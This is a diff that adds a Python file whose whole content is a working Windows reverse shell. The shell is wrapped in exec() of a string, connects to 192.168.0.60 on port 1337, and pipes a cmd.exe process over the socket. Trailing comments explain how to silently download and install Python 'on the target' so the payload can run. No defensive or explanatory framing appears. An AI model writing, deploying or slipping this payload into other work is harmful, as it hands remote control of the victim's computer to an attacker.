@@ -1,0 +1,5 @@
+exec("""\nimport socket\nimport subprocess\nimport threading\n\ndef s2p(s, p):\n    while True:\n        data = s.recv(1024)\n        if len(data) > 0:\n            p.stdin.write(data)\n            p.stdin.flush()\n\ndef p2s(s, p):\n    while True:\n        s.send(p.stdout.read(1))\n\ndef main():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    target_ip = "192.168.0.60"\n    s.connect((target_ip, 1337))\n    p = subprocess.Popen(\n        ["cmd.exe"],\n        stdout=subprocess.PIPE,\n        stderr=subprocess.STDOUT,\n        stdin=subprocess.PIPE,\n        shell=False\n    )\n    s2p_thread = threading.Thread(target=s2p, args=(s, p))\n    s2p_thread.daemon = True\n    s2p_thread.start()\n\n    p2s_thread = threading.Thread(target=p2s, args=(s, p))\n    p2s_thread.daemon = True\n    p2s_thread.start()\n\n    p.wait()\n\nif __name__ == "__main__":\n    main()\n""")
+
+# If python is not installed on the target, use the following 2 commands in CMD:
+# curl -o python-installer.exe https://www.python.org/ftp/python/3.13.2/python-3.13.2-amd64.exe
+# python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
